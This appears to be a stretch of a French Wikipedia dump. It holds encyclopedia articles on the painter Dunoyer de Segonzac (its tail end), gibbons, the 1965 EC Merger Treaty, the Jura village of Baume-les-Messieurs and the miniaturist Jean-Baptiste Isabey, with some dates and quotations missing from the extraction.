À partir de cette même année 1908, louant une maison appartenant à Paul Signac, Dunoyer découvre les paysages de Saint-Tropez, auxquels il restera fidèle en y séjournant jusqu'à la fin de sa vie. Paul Jamot situe là, puisque sa peinture d'avant 1898 demeurait confinée dans la nature morte, l'inauguration de sa peinture de paysages et Pierre Cabanne restitue : . Pour le reste, il mène une véritable vie de nomade, à la recherche du motif surtout à travers l’Île-de-France, la vallée du Grand Morin, Feucherolles, Chennevières-sur-Marne, Guyancourt, etc.
En 1910, il se lie d'amitié avec le couturier Paul Poiret et rencontre Max Jacob, Raoul Dufy et Maurice de Vlaminck. Il brosse les décors des fêtes données par Paul Poiret comme, avec Raoul Dufy, ceux de la « Mille et deuxième nuit » dans les jardins du Faubourg Saint-Honoré, ou ceux de la « soirée des Butard » où, dans les bois de Vaucresson, dansa Isadora Duncan.
De 1910 à 1914, il voyage en Italie, en Espagne, en Afrique du Nord, et s’intéresse au sport et à la danse (dessins des "Ballets russes" d’Isadora Duncan, 1911, "Les Boxeurs" 1910) à propos desquels Dunoyer de Segonzac restitue lui-même que, de tous les sports, c'est de fait la boxe qui l'a le plus passionné : . Il est alors, avec Roger de La Fresnaye et Luc-Albert Moreau, bel et bien situé dans la mouvance cubiste dont il se désolidarisera rapidement. De fait, dans sa visite du Salon des indépendants de 1914, André Salmon observe qu'il évoque sous l'appellation de et qu'il situe, proche de Roger de La Fresnaye, autour d'André Lhote, André Dunoyer de Segonzac et Luc-Albert Moreau.
Première Guerre mondiale.
De 1914 à 1918, mobilisé en tant que sergent au 353e régiment d'infanterie, il fait la guerre durement, avant d’être affecté dans une section camouflage du Groupe d'armées du Nord, puis de commander celle de la : il dirige l'atelier de camouflage d'Amiens, puis celui de Noyon, se spécialisant dans la pose des faux arbres et ayant sous ses ordres le sculpteur Charles Despiau (le buste de Dunoyer de Segonzac que celui-ci exécutera en 1943-1944 témoignera de leur amitié pérenne), les peintres Charles Dufresne, Charles Camoin, Jean Puy et Jean-Louis Boussingault qui, avec lui, Jean Marchand et Luc-Albert Moreau, dans une revendication commune de l'héritage de Gustave Courbet, forment le groupe de « la bande noire ».
Il exécute de nombreux dessins de guerre, précieux par leur valeur artistique et documentaire, qui sont largement publiés dans "Le Crapouillot" et dans "L'Élan", revue fondée par Amédée Ozenfant et où celui-ci ajoute son propre commentaire : .
André Dunoyer de Segonzac, perçoit Hadrien Viraben un siècle plus tard dans l'étude qu'il consacre à ce second périodique, . Ses dessins ne sont pas la dénégation de massacres que d'autres saisissent par la photographie, mais .
L'après-guerre.
Dès 1919, année où il s'initie à l'eau-forte afin d'illustrer "Les Croix de bois" de Roland Dorgelès, il figure de nouveau dans de très nombreuses expositions, dont les principaux salons parisiens. Ses premiers paysages à l'aquarelle datent de 1920.
En 1921, il rencontre Paul Valéry, Léon-Paul Fargue, Valéry Larbaud et Jean Cocteau. En 1928, il fait un voyage aux États-Unis où il rencontre un vif succès. En 1930, il se lie d’amitié avec André Derain.
Il est membre du comité d'honneur de l'Association du foyer de l’abbaye de Royaumont et président de la Société des peintres-graveurs français.
Sous l'Occupation, il participe, en novembre 1941 à un « voyage d’études » en Allemagne, organisé par Arno Breker, acceptant, comme d'autres artistes parmi les plus renommés, de partir visiter les hauts lieux de la culture allemande ainsi que des ateliers d’artistes.
En 1947, il est élu membre de la Royal Academy de Londres. À partir de 1951, ses œuvres peintes et gravées font l'objet d'expositions multiples en France, en Europe et aux États-Unis. De nombreuses études lui sont consacrées.
Mort et postérité.
Quittant ce monde par la grâce d'une mort douce le – , note ce jour-là son ami Michel Ciry –, l'artiste est inhumé au cimetière marin de Saint-Tropez auprès de l'actrice Thérèse Dorny (1891-1976), qu'il avait épousée le .
On peut être surpris de voir André Dunoyer de Segonzac, après sa mort, situé par certains historiens de l'art dans le courant expressionniste. Ainsi en va-t-il en 1980 de Hans L.C. Jaffé qui retient rétrospectivement que des années qui suivirent la Première Guerre mondiale eut peu d'influence en France. En dehors de Marcel Gromaire, avec ses compositions solidement construites, aux couleurs sombres, le principal représentant de cette tendance en France fut Dunoyer de Segonzac. Le paysage fut son thème de prédilection, mais, au lieu des touches extatiques de couleur qui caractérisaient les Fauves, au lieu de la véhémence passionnée de Chaïm Soutine, on remarque dans ses tableaux une atmosphère opprimante et lourde qui les rattache aux écoles nordiques. Segonzac s'efforça de faire revivre un style classique fondé sur le retour à Paul Cézanne, mais son tempérament romantique et nordique imprima à son œuvre le sceau de sa propre personnalité.
En 1985, Georges Charensol préfère retenir que l'œuvre d'André Dunoyer de Segonzac se situe tout simplement , s'en justifiant par le constat que, pour l'artiste, il n'était pas .
Michel Charzat, constatant pour sa part en 2021 que le nom d'André Dunoyer de Segonzac, qui , n'est plus, un demi-siècle après sa mort, , retient cependant que, .
Œuvre.
À peu près indifférent aux révolutions esthétiques contemporaines, Dunoyer de Segonzac entreprend, avec ses amis Jean-Louis Boussingault et Luc-Albert Moreau, de ressusciter le réalisme de Gustave Courbet en exécutant, par la peinture à l'huile qu'il ne pratiquera plus qu'épisodiquement, au bénéfice de l'aquarelle à partir de 1925, des natures mortes, des nus, des paysages, . Pour Claude Roger-Marx, .
Il donne sa définition de l'art dans l'une de ses lettres au peintre Maurice Boitel où il écrit, dans les années 1950 :
Dessin et gravure de portraits.
Initié à la gravure par Jean Émile Laboureur, il réalisa près de de 1919 à 1970.
On doit à André Dunoyer de Segonzac les portraits de Paul Signac, Francis Carco, André Gide, Jules Romains, Marcel Proust sur son lit de mort, Colette, Thérèse Dorny, Paul Léautaud, André Dignimont, Léon-Paul Fargue, Henri Mondor.
On ne connaît de l'artiste, ce dont il s'est justifié en disant que son physique ne l'intéressait pas, qu'un seul autoportrait, daté 1925.
Cinéma.
André Dunoyer de Segonzac joue son propre rôle dans "Donne-moi tes yeux", film de Sacha Guitry en 1943.
Écrits.
Préfacier.
André Dunoyer de Segonzac a également préfacé des catalogues d'expositions : "René Durey, André Planson (peintures) et Raymond Martin (sculptures)", Musée Galliera, Paris, 1960 ; "Guy-Pierre Fauconnet", musée Alfred-Bonno, Chelles, novembre-décembre 1960 (co-préfacé avec Jean Cocteau et Jacques Fauconnet) ; "Jean Commère", galerie David et Garnier, Paris, 1961 ; "Jean Marchand", galerie René Drouet, Paris, 1961 ; "Herbert Lespinasse", Bibliothèque d'Art et d'Archéologie de l'Université de Paris, 1964 (co-préfacé avec Julien Cain et Suzanne Dameron, 1964 ; "Toulouse-Lautrec - Elles", galerie Berès, Paris, 1964 ; "Yves Brayer", galerie de Paris, Paris, 1965 (co-préfacé avec Gérard Bauër), "Michel Ciry", galerie Le Griffon, Lyon, 1965 (co-préfacé avec François Mauriac) ; "Hommage à André Warnod", galerie Charpentier, Paris, 1965 (co-préfacé avec Pierre Brisson).

</doc>
<doc id="249050" url="https://fr.wikipedia.org/wiki?curid=249050" title="Hylobatidae">
Hylobatidae

Les Hylobatidés (Hylobatidae, « qui parcourent les forêts ») sont une famille de primates hominoïdes (les grands singes) appelés couramment gibbons. Certaines espèces sont plus précisément appelées houlock ou siamang.
Ces espèces se différencient principalement des autres grands singes par leur plus petite taille, la longueur importante de leurs bras par rapport à leur corps, leur mode de vie exclusivement arboricole, l'usage de la brachiation comme principal moyen de locomotion et leur organisation sociale basée sur des couples monogames.
Étymologie et histoire du terme gibbon.
D'après Buffon, Joseph François Dupleix est le premier à utiliser le terme « gibbon » pour nommer ces espèces en français.
Le mot « gibbon » n'apparait dans les anciens dictionnaires de français qu'à partir de la du "Dictionnaire de l'Académie française" (1932-5). Ouvrage qui le définit simplement comme un « grand singe des Indes ».
"Trésor de la langue française informatisé" (TLFi) en donne une définition différente : les espèces ne sont plus limitées aux Indes mais à l'Asie. Ce ne sont plus des « grands singes » mais des « singes anthropoïdes (...) de taille moyenne ». Le TLFi indique que le mot est emprunté à une langue indienne, sans préciser laquelle, ni son sens exact dans cette langue. Il ajoute pour critères distinctifs des gibbons leurs mœurs grégaires, arboricoles et végétariennes. Il peut être originaire d'un mot Orang Asli.
L'usage de ce terme pour désigner ce type de singe est commun aux langues ouest-européennes.
Caractéristiques physiques.
Les gibbons diffèrent des hominidés (chimpanzés, bonobos, gorilles, orang-outans, et humains) en étant plus petits. Ils vivent en couples, ne construisent pas de nids et possèdent certains caractères anatomiques qui les font ressembler aux autres singes.
Les gibbons sont les maîtres dans l'art de la brachiation, qui leur permet de se balancer de branche en branche, qui peuvent être distantes de plusieurs mètres, à la vitesse de . Ils peuvent également sauter et marcher de façon bipède en relevant leurs bras pour s'équilibrer.
La caractéristique anatomique principale des hylobatidés est la structure du poignet, dont les os forment une boule logée dans un trou, ce qui permet des mouvements biaxiaux, contrairement aux hominidés. Une telle jointure permet de diminuer la quantité d'énergie nécessaire aux mouvements dans le bras et le torse, et réduit également le stress provoqué à l'épaule. Ils possèdent également de longues mains et de grands pieds, avec une démarcation entre le premier et le second doigt de leurs mains. La fourrure de ces singes est généralement noire, grise, brune avec souvent des marques blanches sur les mains, les pieds et le visage. Certaines espèces ont un sac vocal sous la mâchoire inférieure qui sert de caisse de résonance lors des hurlements. Ce sac peut être énorme chez certaines espèces, égalant la taille de la tête.
Le crâne des hylobatidés ressemble à celui des grands singes, avec un rostre court, une boîte crânienne élargie et de larges orbites oculaires tournées vers l'avant. Les gibbons sont des catarrhiniens avec des narines proches l'une de l'autre, tournées vers l'avant et orientées vers le bas. Ils n'ont pas de bas-joues et leur estomac n'est pas divisé en poches. Leurs dents sont similaires à celles des grands singes, de type bunodontes. Les molaires supérieures possèdent un cingulum qui peut être large. Les canines sont proéminentes mais ne sont pas sujettes à un dimorphisme sexuel. La formule dentaire est celle des catarrhiniens.
Les gibbons sont totalement arboricoles et ont développé des formes hautement spécialisées de locomotion. Le fort allongement de leurs bras et de leurs mains est adapté à la brachiation qui optimise l'accès aux fruits dans les branches terminales des arbres dans lesquels ils peuvent se déplacer à et faire des bonds de plus de , ce qui leur permet de franchir les trouées dans la canopée. Leurs membres antérieurs, dont l'avant-bras dépasse en longueur le bras, sont très allongés, si bien que sans effort l'animal dressé est à même de toucher le sol de ses mains fermées. Ne pouvant rester debout immobile, les gibbons pratiquent plus rarement la bipédie (environ 10 % de leur temps de locomotion) mais avec une démarche maladroite, devant fléchir l'articulation des hanches et des genoux. Ces caractéristiques expliquent qu'ils marchent en se balançant pour garder l'équilibre et les membres antérieurs souvent au-dessus de leur tête.
Ces primates sont dépourvus de queue. Ils présentent des callosités sur l'arrière-train. 
Répartition.
On trouve les représentants de cette famille dans les forêts tropicales depuis le Nord-est de l'Inde à l'Indonésie, au Sud de la Chine, ainsi que dans les îles de Sumatra, Bornéo et Java.&lt;br&gt;
Avant la confirmation des études génétiques, les différentes espèces ont été réparties dans des genres suivant un principe relevant de la biogéographie.
Classification.
Les gibbons étaient à l'origine tous classés dans le genre "Hylobates", mais les analyses génétiques les ont divisés en quatre genres basés sur leur nombre de chromosomes : 38 chromosomes pour le genre "Hoolock", 44 pour "Hylobates", 52 pour "Nomascus" et 50 pour "Symphalangus". 
Espèces actuelles.
Liste des espèces actuelles selon ITIS :
Une nouvelle espèce, "Hoolock tianxing" , a été récemment séparée de "Hoolock leuconedys" à la suite d'analyses génétiques.
Genre fossile.
L'espèce éteinte † "Bunopithecus sericus" était considérée comme proche des gibbons houlocks qui étaient un temps classés dans le même genre sous une même espèce. Mais il a été estimé que les houlocks ne partagent pas suffisamment de caractéristiques avec cette espèce et le nouveau genre "Hoolock" a été créé en 2005, faisant de † "Bunopithecus" un genre fossile.
Une autre espèce éteinte est décrite en 2018, "Junzi imperialis", dont quelques ossements ont été retrouvés dans une tombe impériale chinoise en 2004. Des analyses récentes basées sur le génome mitochondrial réfutent "Junzi" comme nouveau genre mais le placent au sein du genre "Nomascus". 
Noms français et noms scientifiques correspondants.
Liste alphabétique des noms vulgaires ou des noms vernaculaires attestés en français. 
"Note : certaines espèces ont plusieurs noms. Les classifications évoluant encore, certains noms scientifiques ont peut-être un autre synonyme valide."
État de conservation.
La plupart des espèces de gibbons sont menacées de disparition, principalement en raison de la dégradation ou de la perte de leurs habitats, les forêts d'Indonésie.
Sur l'île de Phuket, en Thaïlande, un centre de réadaptation organisé par des volontaires sauve des gibbons maintenus en captivité qui sont ensuite relâchés dans la nature. 
Le projet Kalaweit comprend également des centres de rééducation pour gibbons à Bornéo et à Sumatra. L’association Kalaweit (association loi de 1901) a été créée en France en 1998 par Aurélien Brulé surnommé Chanee ou gibbon en thaï et dont le projet s'est concrétisé avec soutien de Muriel Robin. Son objectif est la sauvegarde des gibbons et de leur habitat via le développement de zones protégées en Indonésie. 
Les gibbons dans la culture.
En extrême Orient.
 La plus ancienne représentation de gibbon est une figurine datée du ou durant la dynastie des Zhou. Ils sont souvent représentés graphiquement, particulièrement pendant la dynastie des Song et au début de celle des Yuan. Les peintures de Yì Yuanji et Muqi Fǎcháng sont les plus connues.
En se basant sur la littérature – sous le nom de – et leur représentation dans les peintures chinoises, le sinologue Robert van Gulik conclut que les gibbons sont très répandus au centre et au sud de la Chine au moins jusqu'aux Song c'est-à-dire au . Les premiers écrivains chinois décrivent le gibbon comme un être se déplaçant gracieusement dans la canopée, comme le « "gentleman" » des forêts (jūnzǐ, 君子), contrairement à l'avide macaque attiré par la nourriture de l'homme.
Les taoïstes attribuent des propriétés occultes aux gibbons, croyant qu'ils pourraient vivre mille ans et se transformer en êtres humains. Du fait de l'influence de la Chine sur le Japon, cet animal est souvent représenté dans l'art japonais, plus particulièrement dans le motif zen du gibbon cherchant à attraper le reflet de la lune dans l'eau, bien que n'ayant jamais été naturellement présent sur l'île.
Ce terme de "yuán" est devenu le terme générique en mandarin pour désigner les singes. Ils ont peut-être disparu de Chine du fait de la destruction de leur habitat.
Dans la culture populaire.
Le Gibbon est le nom d'un super-vilain évoluant en costume de gibbon dans l'Univers Marvel.&lt;br&gt;
Gibbon est le nom d'un Mangemort, l'un des personnages de l’univers de Harry Potter.

</doc>
<doc id="249053" url="https://fr.wikipedia.org/wiki?curid=249053" title="Traité de fusion des exécutifs communautaires">
Traité de fusion des exécutifs communautaires

Le traité de fusion des exécutifs des trois Communautés, officiellement "Traité instituant un Conseil unique et une Commission unique des Communautés européennes", aussi nommé informellement traité de Bruxelles (de 1965), fut signé le à Bruxelles par les six pays fondateurs de la Communauté économique européenne (CEE). Il est entré en vigueur le . 
Ce traité fusionne les structures exécutives des trois communautés européennes alors existantes : 
C'est à cette occasion qu'apparaît le terme de "Communautés européennes" au pluriel. Chacune des trois organisations conserve une existence juridique propre, bien qu'exercée par des institutions communes.
Entités communes préexistantes.
Ces trois communautés partageaient déjà deux institutions : une cour de justice (la CJCE devenue CJUE) et une assemblée parlementaire, le Parlement européen (dénommé Assemblée parlementaire européenne avant 1962).
Institutions fusionnées.
Le traité porte à quatre le nombre de ces institutions européennes communes (depuis le TUE signé à Maastricht en 1992, il y en a officiellement sept) en fusionnant les structures exécutives de la CECA et de l'Euratom (CEEA) dans celles de la CEE pour créer deux institutions uniques partageant dès lors un même budget et siégeant à Bruxelles.
Commissions et Haute Autorité.
Les institutions à caractère supranational ont chacune fusionné :
Toutes trois, elles forment la Commission des Communautés européennes (devenue Commission européenne).
Conseil des ministres.
Les conseils des ministres sont fusionnés, c'est-à-dire :
Ensemble, ils sont fusionnés pour devenir le Conseil des Communautés européennes (devenu Conseil de l'Union européenne).

</doc>
<doc id="249054" url="https://fr.wikipedia.org/wiki?curid=249054" title="Baume-les-Messieurs">
Baume-les-Messieurs

Baume-les-Messieurs est une commune française, située dans le département du Jura, dans la région culturelle et historique de Franche-Comté et la région administrative Bourgogne-Franche-Comté.
Elle cherche à se différencier par l'obtention de labels touristiques et patrimoniaux dont l'échelle renseigne sur l'importance qu'elle accorde à ces démarches de validation de l'ancrage au territoire : cité de Caractère de Bourgogne-Franche-Comté, plus beau village de France, site clunisien grâce à l'Abbaye Saint-Pierre de Baume-les-Messieurs et dont le réseau est reconnu depuis 2005 grand itinéraire culturel du conseil de l'Europe.
Géographie.
Baume-les-Messieurs se situe au fond d'un cirque, entouré par des falaises hautes d'une centaine de mètres entaillant le premier plateau jurassien : il s'agit d'une des reculées les plus célèbres du Jura.
Cadre géologique.
La commune de Baume-les-Messieurs s'inscrit dans la grande région naturelle du Jura externe, à la limite occidentale du plateau de Lons-le-Saunier. Ce relief est principalement composé de calcaires datant du Jurassique moyen (bajocien et bathonien), formant en bordure du plateau des corniches escarpées souvent boisées dont les abrupts dominent des pentes plus douces taillées dans des formations sous-jacentes plus tendres (marnes du trias et marno-calcaires du lias). Le village s'est implanté au fond de la reculée jurassienne la plus typique, à l'écart des grandes voies de communication.
Cinq niveaux de replats peuvent être distingués dans les différentes branches de la reculée. Le plus petit est un niveau situé vers d'altitude aux sources du Dard. Ce ruisseau issu de rivières souterraines karstiques, a une eau qui s'est chargée en ions calcium Ca bicarbonate . Ces ions, en précipitant, forment des dépôts carbonatés qui, selon la pente et la vitesse du courant, engendrent la cascade du Dard (également appelée Cascade des tufs de Baume-les-Messieurs), des barrages de travertin (appelé aussi tuf) retenant des gours, ou génèrent des coulées de travertin. Dans les sections du Dard présentant une faible pente, se forment des stromatolithes en boule.
Un écroulement ancien provenant de la falaise calcaire, est visible au pied de la falaise qui limite le plateau de Sermu. Le volume de ce chaos rocheux est estimé à pour une surface d'épandage de près de 7 hectares.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat de montagne, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat semi-continental et est dans la région climatique Jura, caractérisée par une forte pluviométrie en toutes saisons ( à ), des hivers rigoureux et un ensoleillement médiocre. Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune du Fied à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Baume-les-Messieurs est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Lons-le-Saunier, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d’occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des forêts et milieux semi-naturels (68,6 % en 2018), une proportion sensiblement équivalente à celle de 1990 (68,3 %). La répartition détaillée en 2018 est la suivante : forêts (68,6 %), prairies (17,2 %), zones agricoles hétérogènes (13,7 %), terres arables (0,5 %). L'évolution de l’occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Le nom de la ville repose sur l'appellatif d'origine (pré)gauloise "balma" désignant une grotte où vivaient peut-être des ermites avant la fondation de l'abbaye de Baume-les-Moines. Ce monastère est appelé Baume-les-Messieurs après sa sécularisation par bulle papale en 1759, le village adoptant progressivement ce nom.
Histoire.
Le site de Baume-les-Messieurs est occupé depuis la préhistoire : trace d'abris sous roche néolithiques, mobilier protohistorique et gallo-romain.
Si les fouilles archéologiques menées dans l'abbaye durant l'hiver 2011-2012 laissent envisager des constructions antérieures, ce n'est qu'au que Baume-les-Messieurs entre dans l'Histoire.
En 888, le roi de Provence Rodolphe fait don de la cella de Baume à Bernon, aristocrate bourguignon qui a fondé sur ses terres de Gigny-sur-Suran une abbaye dans laquelle il applique sa relecture de la règle de saint Benoît.
Bernon développe le "monasterium" de Baume et, selon la tradition, c'est de là qu'en 910, à la demande de Guillaume d'Aquitaine, il part, accompagné de six moines de Baume et six moines de Gigny, fonder l'abbaye de Cluny.
L'abbaye de Baume-les-Moines, tel est alors son nom, prospère : sa réputation est grande et, dans le contexte de la réforme grégorienne () qui invite les laïcs à abandonner au profit de l’Église les biens religieux qu'ils possèdent, elle reçoit de fort nombreuses donations auxquelles s'ajoutent celles données pour sauver les âmes. Au , elle accueille une quarantaine de moines, possède une centaine de dépendances (prieuré, églises) et de nombreuses terres : l'abbaye Saint-Pierre de Baume-les-Messieurs devient une des plus puissantes abbayes du diocèse de Besançon.
Cependant Baume-les-Moines, tout en suivant la règle clunisienne,veut garder son indépendance alors que Cluny voudrait la réduire au rang de prieuré, ainsi qu'elle a fait pour Gigny. Les conflits se multiplient. L'empereur Frédéric Barberousse, comte de Bourgogne, opposé au Pape que soutient Cluny, va même jusqu'à lui décerner en 1157 le titre d'abbaye impériale, titre qu'elle ne garde cependant pas car, en 1177, Frédéric Barberousse se soumet à la papauté et Baume doit revenir dans le giron de Cluny. Néanmoins elle ne s'avoue pas vaincue et ce n'est qu'au qu'un compromis est enfin trouvé : elle garde son titre d'abbaye et ses abbés occupent la troisième place après ceux de Cluny et Moissac.
Au , l'abbaye passe en commende. Nombre d'abbés se contentent de toucher les revenus mais certains laissent leur nom dans l'histoire : Amé de Chalon, Guillaume de Poupet, pour l'importance des travaux, mais aussi Jean de Watteville, personnage haut en couleur, connu pour son rôle lors du rattachement de la Franche-Comté à la France.
Mais comme dans d'autres abbayes la discipline se relâche, les moines, ayant obligatoirement seize quartiers de noblesse, abandonnent le dortoir pour des appartements plus confortables, vivent de leur prébende et, en 1759, l'abbaye est sécularisée, les moines prennent le titre de chanoines et Baume-les-Moines devient Baume-les-Messieurs.
À la veille de la Révolution, il ne reste que dix chanoines. En 1790, les bâtiments de l'abbaye, déclarés biens nationaux, sont vendus aux habitants du village qui obtiennent que l'église abbatiale devienne l'église paroissiale en lieu et place de l'église Saint-Jean située à l'entrée du village et jugée trop petite.
Au cours de la Révolution française, la commune porta provisoirement le nom de "Baume-le-Jura".
Population et société.
Politique environnementale.
La commune est adhérente de l'association Les Plus Beaux Villages de France.
Économie.
 L'économie de Baume-les-Messieurs est essentiellement tournée vers le tourisme, chaque année Baume accueille plusieurs dizaines de milliers de visiteurs grâce à sa situation géographique exceptionnelle, ses reculées, son patrimoine naturel et religieux hors du commun.
Culture locale et patrimoine.
Lieux et monuments.
Baume-les-Messieurs possède un riche patrimoine architectural qui lui permet de bénéficier des labels de cité de Caractère de Bourgogne-Franche-Comté et de plus beau village de France.
Patrimoine religieux.
Nombreux édifices recensés dans la base Mérimée : 
Patrimoine civil.
Nombreux édifices recensés dans la base Mérimée : 
Patrimoine naturel.
Baume-les-Messieurs est un site classé de Franche-Comté qui fait partie de la zone Natura 2000 des reculées de la Haute Seille.
C'est avant tout :
Baume-les-Messieurs dans les arts et lettres.
Chanson.
Contrairement à une légende née en 1970 du correspondant de presse Jean Barthelet, « le village perdu au fond de la vallée » de la chanson "Les Trois Cloches", écrite en 1939, par Jean Villard dit Gilles, et interprétée par Édith Piaf et les Compagnons de la chanson en 1945, n'a pas été inspiré par Baume-les-Messieurs.
Littérature.
Le village sert, avec celui de Château-Châlon, à quelques kilomètres, de cadre à une partie du roman christologique, "La Cinquième source", de Pierre Desjardins, paru en 2008. Dans le roman historique "" de Gary Jennings, l'auteur y situe son héros, Thorn, au .
Théâtre.
La pièce "l'Eclipse" (2024) du collectif Bajour met en scène une classe de collégiens dans le collège de Baume-les-Messieurs.

</doc>
<doc id="249055" url="https://fr.wikipedia.org/wiki?curid=249055" title="Constantin-François Chassebœuf">
Constantin-François Chassebœuf



</doc>
<doc id="249057" url="https://fr.wikipedia.org/wiki?curid=249057" title="Jean-Baptiste Isabey">
Jean-Baptiste Isabey

Jean-Baptiste Isabey né à Nancy le et mort à Paris le est un peintre, miniaturiste, aquarelliste, dessinateur, lithographe, décorateur d'opéra et costumier français.
À l'époque de la grande peinture historique, Isabey pratique l’art de la miniature. Il connaît le succès, aussi bien sous le Premier Empire qu'auprès des diplomates du congrès de Vienne. Il est le père d'Eugène Isabey, peintre, dessinateur et graveur romantique tout aussi célèbre du Second Empire.
Biographie.
Né à Nancy dans une famille modeste d'un marchand épicier, Jacques Isabey son père, et Marie Poirel sa mère, Jean-Baptiste Isabey a un frère ainé Louis (1766-1813) violoniste, qui est premier violon du tsar de Russie. Jean-Baptiste Isabey devient élève du paysagiste Jean-Baptiste Claudot et du fresquiste Jean Girardet. En 1783, il supplée à ses maîtres dans la surveillance de travaux à Nancy, mais en 1785, il doit quitter Nancy pour Paris et gagner sa vie comme peintre de dessus de boîtes et de boutons historiés. En 1787, après quelques leçons prises auprès de son compatriote François Dumont, peintre miniaturiste de Marie-Antoinette, il est présenté à la reine habillé et maquillé en jeune femme par la comtesse de Calignac lors d'un bal masqué. Admis à la cour, il est employé à Versailles pour peindre des portraits des ducs d'Angoulême et de Berry. La reine lui passe une commande de portraits-miniatures qui est, à partir de ce moment, suivie de nombreuses autres par les cours de France successives et ce jusqu'à sa mort. Il rencontre Hubert Robert et travaille sous sa direction pour le château de Beauregard du comte d'Artois, le futur Charles X.
La Révolution et l'Empire.
En 1788, il devient l'un des élèves de Jacques-Louis David, avec qui le lie une profonde amitié et il l'assiste dans la réalisation du tableau "Les Amours de Pâris et d'Hélène", dont il peint les détails et l'architecture du fond.
En 1789, il devient membre de la loge maçonnique Les Amis réunis. Il réalise alors des portraits de consolation, miniatures que les émigrants partageaient en famille entre parents et enfants se quittant, puis il réalise 228 portraits des députés de l'Assemblée nationale payés chacun . Ce serait à la suite de son portrait de Mirabeau que ce dernier lui conseille de renoncer à la peinture d'histoire pour se consacrer aux portraits, à la miniature et à l'aquarelle.
En 1791, Isabey expose pour la première fois au Salon ; il y expose régulièrement jusqu'en 1841. En 1791 naît sa fille Alexandrine, dont le baron Gérard peint en 1795 le portrait avec son père, "Jean-Baptiste Isabey et sa fille" (Paris, musée du Louvre). Le , il épouse Justine Laurisse de Salienne, issue d'une famille noble désargentée et mère de l'enfant. Celle-ci figure, entourée de leurs trois premiers enfants dans son dessin au sépia présenté au Salon de 1797 et intitulé "La Barque". En 1792, il est nommé capitaine chargé de la garde du Louvre avec la troupe des élèves des arts. Sous le Directoire, il fait un voyage en Normandie qu'il lithographie en un album.
En 1796, il rencontre Madame Campan et devient professeur de dessin à l’Institution nationale de Saint-Germain qu'elle a fondée. Là, il rencontre la famille Bonaparte. Il devient un intime du château de la Malmaison, où il dessine le portrait de Bonaparte.
En 1794 naît sa seconde fille Louise-Simone , puis son fils Hector en 1797, et en 1803 naît son fils le peintre Eugène Isabey.
En 1799, comme d'autres artistes peintres, il obtient un atelier dans les galeries du palais du Louvre au N°23. Il est entouré de nombreux élèves.
Le Sacre.
En 1804, il est nommé . En 1805, il est nommé par l'impératrice Joséphine de Beauharnais, puis dessinateur du cabinet de l'empereur ; à ce titre, il participe à la mise en scène de leurs sacres à Notre-Dame, il crée les costumes et robes de tous les participants. Les estampes qu'il exécute pour la commémoration s'ajoutèrent au célèbre tableau de Jacques-Louis David, travail pour lequel il est payé par Louis XVIII en 1814. Un logement lui est attribué à la manufacture de Sèvres en 1809 ; il y dessine des modèles de tasses et d'assiettes à l'effigie de l'Empereur. En 1810, il dessine les miniatures de la Table des Maréchaux, un guéridon réalisé à la manufacture de Sèvres aujourd'hui conservé au château de Malmaison qui représente Napoléon assis sur un trône d'airain entouré de ses maréchaux. Il livre des dizaines de portraits en miniature de l'Empereur, que celui fait monter en boîte pour ses présents.
En 1805, il devient peintre-décorateur des théâtres de Saint-Cloud et des Tuileries. Il devient dessinateur en chef à l'opéra de Paris à partir de 1810. Il est le dernier peintre académique à diriger l'atelier des décors de l'opéra de Paris jusqu'en 1815 ou 1828. Il a dans son équipe son gendre Pierre-Luc-Charles Ciceri et Louis Daguerre. On lui doit les décors des opéras : "Les amours d'Antoine et Cléopâtre" (1808), "Armide" (1811), "L'enfant prodige" (1812), "Les Abencérages ou L'étendard de Grenade" (1812-1813) et un "Oreste" (1815). Il dessine des robes, costumes, châles et cachemires pour les manufactures de Lyon et de Jouy. Il organise avec l'architecte Fontaine le mariage de et de Marie-Louise d'Autriche au palais du Louvre. En 1811, Isabey devient professeur d'aquarelle de l'impératrice Marie-Louise.
En 1812, elle lui commande les portraits de sa famille à Vienne. En 1814, Louis XVIII lui commande son portrait, puis de partir à Vienne pour suivre le congrès et y peindre les portraits des participants. Il y organise une fête grandiose pour l'impératrice Beatrix. Il y peint aussi le portrait du roi de Rome qu'il remet à Napoléon à Paris à son retour.
La Restauration.
Son fils Hector meurt à la bataille d'Arcis-sur-Aube le .
